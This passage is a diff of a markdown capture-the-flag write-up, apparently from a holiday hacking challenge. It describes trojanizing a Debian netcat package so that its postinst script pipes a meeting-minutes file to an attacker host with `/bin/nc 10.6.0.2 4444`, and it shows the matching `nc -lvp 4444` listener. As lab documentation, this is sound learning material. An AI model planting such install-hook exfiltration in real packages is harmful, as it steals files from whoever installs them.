@@ -28,7 +28,7 @@ A Node.js HTTP server was started from the home directory using  `python3 -m htt
     10.6.6.35 - - [12/Dec/2020 17:37:02] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -
 
 On the local host the Debian package `netcat-traditional_1.10-41.1ubuntu1_amd64.deb` was found.
-This package was modified to include a netcat command in the postinst script to send the text file to our local host:
+This package was modified to include a netcat command in the postinst script to send the text file to our local host. By using the `netcat` package we can ensure that the `netcat` command is available on the device.
 
 `/bin/nc 10.6.0.2 4444 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt`
 
@@ -67,10 +67,10 @@ That way the remote device would download this package and install it. In course
 
     nc -lvp 4444
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTI4MTg5OTI3NiwxMTk1NDg5NTExLDc5Nz
-M0MTkyMiwyNjg2NTM0ODQsMTI3MjY1NjQxOSw4NTgxODg5Mjks
-MTA5Mjc4NTMyMSwtMjA2MjY3NTI5NywtNjEyODk3Nzk5LC04NT
-I3MjI3MDMsMTc1ODI0MzY3NywxNjM0Mzk0OTQxLDEyMDQ0MjY1
-MzksLTE3OTg0MTU4OTYsLTg3ODM5MjIxNiw1MTQyMDkxNTldfQ
-==
+eyJoaXN0b3J5IjpbMTIwMDM4MDMyLC0yODE4OTkyNzYsMTE5NT
+Q4OTUxMSw3OTczNDE5MjIsMjY4NjUzNDg0LDEyNzI2NTY0MTks
+ODU4MTg4OTI5LDEwOTI3ODUzMjEsLTIwNjI2NzUyOTcsLTYxMj
+g5Nzc5OSwtODUyNzIyNzAzLDE3NTgyNDM2NzcsMTYzNDM5NDk0
+MSwxMjA0NDI2NTM5LC0xNzk4NDE1ODk2LC04NzgzOTIyMTYsNT
+E0MjA5MTU5XX0=
 -->
